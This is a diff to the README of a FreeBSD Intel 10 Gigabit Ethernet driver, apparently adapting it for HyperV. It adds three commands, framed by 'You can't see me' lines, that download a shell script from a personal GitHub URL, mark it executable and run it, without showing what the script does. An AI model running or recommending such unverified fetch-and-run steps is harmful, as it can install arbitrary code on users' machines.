@@ -3,6 +3,13 @@ FreeBSD Driver for Intel(R) Ethernet 10 Gigabit PCI Express Server Adapters
 
 March 10, 2021
 
+WIP
+Modified 1.5.33 for FreeBSD on HyperV, use at your own risk
+~~~~You can't see me~~~
+fetch https://raw.githubusercontent.com/alastorid/if_ixv/main/a.sh
+chmod +x a.sh
+./a.sh
+~~~~You can't see me~~~
 
 Contents
 ========
